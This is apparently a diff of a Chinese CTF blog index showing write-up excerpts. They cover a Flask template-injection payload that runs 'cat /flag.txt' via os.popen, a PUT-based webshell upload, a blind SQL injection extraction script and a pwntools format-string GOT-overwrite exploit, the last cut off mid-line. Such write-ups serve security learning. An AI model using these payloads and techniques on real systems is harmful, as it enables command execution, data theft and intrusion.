+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File &quot;/app/app.py&quot;, line 35, in secret</span></span><br><span class="line">    <span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">    rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#解密</span></span><br><span class="line">    deS=rc.do_crypt(secret)</span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>
+
+<p>RC4解密后进行render渲染，很明显直接模板注入</p>
+<h3 id="RC4加密脚本："><a href="#RC4加密脚本：" class="headerlink" title="RC4加密脚本："></a>RC4加密脚本：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key=<span class="string">&quot;HereIsTreasure&quot;</span>, message=<span class="string">&quot;ciscn&quot;</span></span>):</span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;res用于加密字符串，加密后是：%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密后的字符串是：%s&quot;</span> % quote(cipher))</span><br><span class="line">    <span class="comment"># print(&quot;加密后的输出(经过编码):&quot;)</span></span><br><span class="line">    <span class="comment"># print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>, <span class="string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag.txt&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后传参secret，即可获取flag</p>
+
+	
+	</div>
+  <a type="button" href="/2023/09/04/NISACTF2022-isSecret-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/09/03/Hacklu2015-stackstuff-wp/" >nightmare 7.1.1.Hacklu2015-stackstuff-wp</a>
 								</h3>
 							</div>
@@ -452,190 +629,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/08/29/NSS2022-basic-check-wp/" >NSS2022 Round1-basic-check-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-08-29
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2199">题目链接</a></p>
-<p>打开页面看见源码什么都没有</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>ph <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="comment">// Welcome to NSSCTF Round#1 Basic, have fun. </span></span><br></pre></td></tr></table></figure>
-
-<p>目录扫描也没得到有用信息</p>
-<p><code>curl</code>或<code>nikto</code>扫描可以发现可以使用 <strong>PUT</strong> 方法来上传文件</p>
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/29/NSS2022-basic-check-wp/0x1.png?raw=true" alt="img"><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/29/NSS2022-basic-check-wp/0x2.png?raw=true" alt="img"></p>
-<h2 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h2><blockquote>
-<p>如果请求URI（Request-URI）指定的的资源已经在源服务器上存在，那么此请求里的实体应该被当作是源服务器关于此URI所指定资源实体的最新修改版本。如果请求URI（Request-URI）指定的资源不存在，并且此URI被用户代理定义为一个新资源，那么源服务器就应该根据请求里的实体创建一个此URI所标识下的资源</p>
-</blockquote>
-<p>指定url和内容，生成对应文件</p>
-<p>BP抓包修改方法和文件名，加上一句话木马，发送即可   然后post cmd或连接蚁剑获取flag</p>
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/29/NSS2022-basic-check-wp/0x3.png?raw=true" alt="img"></p>
-
-	
-	</div>
-  <a type="button" href="/2023/08/29/NSS2022-basic-check-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/08/28/CISCN2019-华北Day2-wp/" >CISCN2019-华北Day2-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-08-28
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1">题目链接</a></p>
-<p>尝试发现存在过滤</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id = <span class="number">0</span>	<span class="string">&quot;Error Occured When Fetch Result.&quot;</span></span><br><span class="line">id = <span class="number">1</span>	<span class="string">&quot;Hello, glzjin wants a girlfriend.&quot;</span></span><br><span class="line">id = <span class="number">2</span>	<span class="string">&quot;Do you want to be my girlfriend?&quot;</span></span><br><span class="line">id = &#123;被过滤部分&#125;	<span class="string">&quot;SQL Injection Checked.&quot;</span></span><br><span class="line">id = &#123;其他&#125;	<span class="string">&quot;bool(false)&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>fuzz发现空格被过滤，大部分函数都没被过滤</p>
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/28/CISCN2019-%E5%8D%8E%E5%8C%97Day2-wp/0x1.png?raw=true" alt="img"></p>
-<p>尝试<code>0^1</code>发现回显对应1的内容，猜测为数字注入，可直接写表达式</p>
-<p>尝试<code>if(1,1,0)</code>，同样对应1的内容</p>
-<p>则可通过<code>if((ascii(substr((select(flag)from(flag)),1,1))=78),1,0)</code>来判断flag中每一位的内容（想更快也可以把等号换成大于号 用二分法）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">alpha = <span class="string">&#x27;ufesridnophmabcgjklqtvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-&#x27;</span>	</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28761&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;NSSCTF&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, <span class="number">50</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> alpha:</span><br><span class="line">		data = <span class="string">f&#x27;if((ascii(substr((select(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;<span class="built_in">ord</span>(j)&#125;</span>),1,0)&#x27;</span></span><br><span class="line">		</span><br><span class="line">		res = requests.post(url = url, data = &#123;<span class="string">&quot;id&quot;</span>: data&#125;)</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">			flag += j</span><br><span class="line">			<span class="built_in">print</span>(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
-
-	
-	</div>
-  <a type="button" href="/2023/08/28/CISCN2019-华北Day2-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/08/25/watevrctf2019-betstar-wp/" >nightmare 3.4.watevrctf2019-betstar-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-08-25
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/10-fmt_strings/watevrctf19_betstar">相关资源</a>  </p>
-<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec betstar</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
-
-<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Welcome to the ultimate betting service.&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;Enter the amount of players: &quot;</span>);</span><br><span class="line">fgets(s, <span class="number">3</span>, <span class="built_in">stdin</span>);</span><br><span class="line">num = atoi(s);</span><br><span class="line">players = (person *)<span class="built_in">malloc</span>(<span class="number">8</span> * (num + <span class="number">6</span>));</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; ++i) &#123;		<span class="comment">// 创建num个玩家</span></span><br><span class="line">    v4 = &amp;players[i];</span><br><span class="line">    v4-&gt;name = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">4u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;Name: &quot;</span>);</span><br><span class="line">    fgets(players[i].name, <span class="number">10</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    strtok(players[i].name, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"><span class="keyword">switch</span> (option) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:		<span class="comment">// 进行一局猜数</span></span><br><span class="line">    play_round(players);	</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:		<span class="comment">//展示各玩家得分</span></span><br><span class="line">    show_score(players, num);	</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:		<span class="comment">// 增添玩家</span></span><br><span class="line">    <span class="keyword">if</span> (v9 == <span class="number">6</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Ughh, stop it. I already added enought players for you. Stop &quot;</span></span><br><span class="line">             <span class="string">&quot;bothering me&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Welcome new player!&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;Please enter your name: &quot;</span>);</span><br><span class="line">        v5 = &amp;players[num];</span><br><span class="line">        v5-&gt;name = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">4u</span>);</span><br><span class="line">        fgets(players[num].name, <span class="number">20</span>, <span class="built_in">stdin</span>);</span><br><span class="line">        strtok(players[num++].name, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        ++v9;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:		<span class="comment">// 更改玩家名</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Which player index should i change: &quot;</span>);</span><br><span class="line">    fgets(nptr, <span class="number">5</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    v14 = atoi(nptr);</span><br><span class="line">    <span class="keyword">if</span> (v14 &gt;= <span class="number">0</span> &amp;&amp; v14 &lt;= num) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Enter new name: &quot;</span>);</span><br><span class="line">        fgets(players[v14].name, <span class="number">18</span>, <span class="built_in">stdin</span>);</span><br><span class="line">        strtok(players[v14].name, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="play-round函数"><a href="#play-round函数" class="headerlink" title="play_round函数"></a>play_round函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;Amount of players playing this round: &quot;</span>);</span><br><span class="line">fgets(s, <span class="number">5</span>, <span class="built_in">stdin</span>);		<span class="comment">// 指定前n个玩家参与游戏</span></span><br><span class="line">v6 = atoi(s);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Each player makes a bet between 0 -&gt; 100, the one who lands closest win &quot;</span></span><br><span class="line">     <span class="string">&quot;the round!&quot;</span>);</span><br><span class="line">v8 = rand() % <span class="number">100</span> + <span class="number">1</span>;</span><br><span class="line">v3 = <span class="number">-1</span>;</span><br><span class="line">v4 = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; v6; ++i) &#123;	</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, players[i].name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#x27;s bet: &quot;</span>);</span><br><span class="line">    v1 = fgets(v10, <span class="number">5</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    v7 = atoi(v1);</span><br><span class="line">    <span class="keyword">if</span> (v4 &gt; (<span class="type">int</span>)abs32(v8 - v7)) &#123;</span><br><span class="line">        v3 = i;</span><br><span class="line">        v4 = v7;</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, players[i].name);	<span class="comment">// 猜数离生成的随机数最近的玩家胜出，名存于dest</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;And the winner is *drumroll*: &quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(dest);	<span class="comment">// *********此处存在格式化字符串漏洞*********</span></span><br><span class="line">++players[v3].score;</span><br></pre></td></tr></table></figure>
-
-<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><ol>
-<li>创建多名玩家，构造首位玩家名进行游戏泄露地址</li>
-<li>准备将<code>system</code>真实地址写入到<code>strtok@got</code>中，这样覆盖之后再有调用处理输入<code>/bin/sh</code>即可获取shell</li>
-<li>由于<code>system</code>真实地址和<code>strtok</code>真实地址都是<code>0x7f</code>开头的，所以只需要覆盖最低三个字节（通过<code>%hhn</code>写入单字节，<code>%hn</code>写入双字节）</li>
-<li>拆分<code>system</code>地址的每个byte并计算相隔差距</li>
-<li>改名，此处要注意不能直接改相邻玩家，因为输入超过了分配的内存空间，会造成后面的被覆盖，所以可以改玩家0，2，4的名称</li>
-<li>多名玩家一起多进行几把猜数游戏，前面构造的三个玩家在某次胜利后就会写入目标地址（注意一定要都改完名再进行游戏，如果改一个进行一次可能导致strtok地址不可用，程序崩溃）</li>
-</ol>
-<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><ol>
-<li>此处更改<code>atoi</code>真实地址</li>
-<li>同样计算偏移量，构造格式化字符串（写入两次双字节）</li>
-<li>这次直接将字符串拆成两部分分别改玩家0和玩家1，改玩家1的时候覆盖玩家0名字末尾的终止符，成为一个字符串</li>
-<li>只要玩家0玩一次即可</li>
-</ol>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./betstar&quot;</span>, stdin=pty, stdout=pty)</span><br><span class="line">belf = ELF(<span class="string">&quot;./betstar&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_round</span>(<span class="params">num</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;End the game&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Amount&#x27;</span>, <span class="built_in">str</span>(num).encode())</span><br><span class="line">    <span class="comment"># ts = []</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        t = randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">        sla(<span class="string">b&#x27;bet:&#x27;</span>, <span class="built_in">str</span>(t).encode())</span><br><span class="line">        <span class="comment"># ts.append(t)</span></span><br><span class="line">    <span class="comment"># info(ts)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">idx, name</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;End the game&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;change: &#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;name: &#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_player</span>(<span class="params">name</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;End the game&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;name: &#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_offset</span>(<span class="params">bt</span>):</span><br><span class="line">    <span class="keyword">return</span> (bt - <span class="number">4</span> + <span class="number">0x100</span>) % <span class="number">0x100</span>		<span class="comment"># 可能被减为负，需要加上然后区域</span></span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    pie b 0x000009DF</span></span><br><span class="line"><span class="string">    pie b 0x00000D71</span></span><br><span class="line"><span class="string">    pie b 0x00000E47</span></span><br><span class="line"><span class="string">    pie b 0x000009A7</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> mode == <span 